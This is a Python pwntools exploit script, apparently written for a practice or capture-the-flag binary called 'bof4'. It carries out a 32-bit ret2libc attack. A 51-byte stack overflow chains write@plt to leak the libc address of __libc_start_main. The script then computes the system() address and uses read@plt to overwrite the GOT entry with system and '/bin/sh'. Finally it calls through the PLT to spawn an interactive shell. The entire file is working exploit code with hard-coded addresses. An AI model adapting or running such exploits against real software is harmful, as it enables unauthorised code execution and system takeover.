#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.bits = 32
context.endian = 'little'

#0001ed40 T __libc_start_main@@GLIBC_2.0
#00045000 W system@@GLIBC_2.0
#08049030 <read@plt>:
#08049050 <__libc_start_main@plt>: 0x804c014
#08049060 <write@plt>: 0x804c018

write_plt = 0x08049060
read_plt = 0x08049030
__libc_start_main_plt = 0x08049050
__libc_start_main_got = 0x0804c014
main_rel = 0x0001ed40
system_rel = 0x00045000
rop3 = 0x08049269 #rp -f bof4 -r 3 --unique |grep pop ->0x08049269: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found) 

offset = 51 


#payload construction
#leak address
payload = b'A' * offset
payload += p32(write_plt)
payload += p32(rop3)
payload += p32(1)
payload += p32(__libc_start_main_got)
payload += p32(4)

#recieve preparation technique.
payload += p32(read_plt)
payload += p32(rop3)
payload += p32(0)
payload += p32(__libc_start_main_got)
payload += p32(20)

#spawn shell
payload += p32(__libc_start_main_plt)
payload += b'BBBB'
payload += p32(__libc_start_main_got + 4)

#connect process
p = process('./bof4')
p.recvline('Hello')
p.send(payload)

#recieve __libc_start_main(not got!!!) from server
__libc_start_main = u32(p.recv(4))
#calculate baseaddr of libc 
baseaddr = __libc_start_main - main_rel
#calculate systemaddr from baseaddr
systemaddr = baseaddr + system_rel

#send payload to server's read()
p.send(p32(systemaddr)+b'/bin/sh\0')
#and get a shell!
p.interactive()



